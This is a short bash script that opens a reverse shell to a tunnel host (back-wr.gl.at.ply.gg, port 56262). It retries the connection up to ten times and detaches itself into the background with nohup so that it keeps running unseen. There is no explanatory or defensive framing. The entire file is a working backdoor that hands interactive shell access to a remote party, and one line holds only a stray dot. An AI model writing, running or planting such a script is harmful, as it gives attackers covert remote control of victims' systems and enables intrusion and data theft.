#!/bin/bash

HOST="back-wr.gl.at.ply.gg"
PORT=56262
MAX_RETRIES=10
RETRY_INTERVAL=5 # 5 seconds


connect() {
    local retries=0
    while [ $retries -lt $MAX_RETRIES ]; do
        .
        /bin/bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1

        # If the connection closes, increment retries and wait before trying again.
        retries=$((retries + 1))
        sleep $RETRY_INTERVAL
    done
}

# Check for the --background argument to determine if this is the parent or child.
if [ "$1" == "--background" ]; then

    connect
else

    nohup /bin/bash "$0" --background > /dev/null 2>&1 &

    # The parent process exits, freeing up the terminal.
    exit 0
fi
